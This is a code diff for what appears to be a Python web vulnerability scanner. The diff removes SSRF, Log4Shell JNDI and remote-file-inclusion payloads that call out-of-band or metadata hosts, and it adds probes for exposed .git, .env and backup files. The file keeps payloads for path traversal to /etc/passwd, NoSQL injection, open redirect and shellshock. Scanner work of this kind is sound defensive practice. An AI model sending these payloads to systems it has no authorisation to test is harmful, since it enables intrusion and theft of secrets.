@@ -1,12 +1,7 @@
-"""Deterministic CVE exploitation checks with zero false-positives.
-
-31 checks — each uses a specific detection signature that either proves
-a vulnerability with a concrete PoC or reports clean. Nothing in between.
-"""
+"""Deterministic security checks that emit candidates for typed validation."""
 
 from __future__ import annotations
 
-import os
 import re
 import uuid
 from dataclasses import dataclass
@@ -31,6 +26,11 @@ class CheckResult:
     target_url: str
     poc_url: str = ""
     proof_signal: str = ""
+    check_key: str = ""
+    request_method: str = "GET"
+    request_headers: dict | None = None
+    request_data: dict | None = None
+    payload_spec: dict | None = None
 
 
 @dataclass
@@ -76,7 +76,6 @@ CHECKS: list[CheckDefinition] = [
     ),
     CheckDefinition("directory_listing", "Directory Listing", Severity.MEDIUM, header_only=True),
     # Low (4)
-    CheckDefinition("host_header", "Host Header Injection", Severity.LOW, header_only=True),
     CheckDefinition("clickjacking", "Clickjacking", Severity.LOW, header_only=True),
     CheckDefinition("missing_headers", "Missing Security Headers", Severity.LOW, header_only=True),
     CheckDefinition(
@@ -84,7 +83,7 @@ CHECKS: list[CheckDefinition] = [
     ),
 ]
 
-# Detection signatures for zero-false-positive verification
+# Detection signatures for candidate generation; validation supplies proof policy.
 SQLI_SIGNATURES = [
     "You have an error in your SQL syntax",
     "ORA-01756",
@@ -183,18 +182,13 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "file", "value": "../../../../etc/passwd", "method": "GET"},
             {"param": "page", "value": "....//....//etc/passwd", "method": "GET"},
         ],
-        "ssrf": [
-            {"param": "url", "value": f"http://{os.environ.get('INTERACTSH_SERVER', '169.254.169.254/latest/meta-data/')}", "method": "GET"},
-        ],
+        "ssrf": [],
         "open_redirect": [
             {"param": "redirect", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
             {"param": "next", "value": f"//{RUN_CANARY}.com", "method": "GET"},
             {"param": "url", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
         ],
-        "log4shell": [
-            {"header": "X-Api-Version", "value": f"${{jndi:ldap://{os.environ.get('INTERACTSH_SERVER', 'log4j.' + RUN_CANARY + '.interact.sh')}/a}}", "method": "HEADER"},
-            {"header": "User-Agent", "value": f"${{jndi:ldap://{os.environ.get('INTERACTSH_SERVER', 'log4j.' + RUN_CANARY + '.interact.sh')}/a}}", "method": "HEADER"},
-        ],
+        "log4shell": [],
         "shellshock": [
             {
                 "header": "User-Agent",
@@ -206,9 +200,12 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "username", "value": '{"$gt":""}', "method": "POST"},
             {"param": "password", "value": '{"$gt":""}', "method": "POST"},
         ],
-        "rfi": [
-            {"param": "file", "value": f"http://{RUN_CANARY}.com/shell.txt", "method": "GET"},
-            {"param": "url", "value": f"http://{RUN_CANARY}.com/shell.txt", "method": "GET"},
+        "rfi": [],
+        "git_exposed": [{"path": "/.git/config", "method": "GET_PATH"}],
+        "env_exposed": [{"path": "/.env", "method": "GET_PATH"}],
+        "backup_file": [
+            {"path": "/backup.sql", "method": "GET_PATH"},
+            {"path": "/db.sql", "method": "GET_PATH"},
         ],
         "xxe": [
             {
@@ -348,7 +345,7 @@ def verify_finding(
         for pattern in SENSITIVE_DATA_PATTERNS:
             match = pattern.search(response_body)
             if match:
-                return True, f"Secret pattern matched: {match.group()[:20]}..."
+                return True, "Secret pattern matched; value withheld"
         return False, ""
 
     elif check_key == "git_exposed":
@@ -452,9 +449,17 @@ def verify_finding(
         return False, ""
 
     elif check_key == "idor":
-        if payload.get("value") in ["1", "0"] and response_headers.get("content-type", "").startswith("application/json"):
-            if any(k in response_body.lower() for k in ["\"email\":", "\"password_hash\":", "\"role\": \"admin\"", "\"is_admin\": true"]):
-                return True, f"IDOR resource returned sensitive user fields for id={payload.get('value')}"
+        if payload.get("value") in ["1", "0"] and response_headers.get(
+            "content-type", ""
+        ).startswith("application/json"):
+            if any(
+                k in response_body.lower()
+                for k in ['"email":', '"password_hash":', '"role": "admin"', '"is_admin": true']
+            ):
+                return (
+                    True,
+                    f"IDOR resource returned sensitive user fields for id={payload.get('value')}",
+                )
         return False, ""
 
     return False, ""
@@ -473,4 +478,3 @@ def generate_xss_payloads(url: str = "") -> list[str]:
 def generate_ssti_payloads(url: str = "") -> list[str]:
     """Generate SSTI payload strings."""
     return [p.get("value", "") for p in build_payloads("ssti", url) if p.get("value")]
-
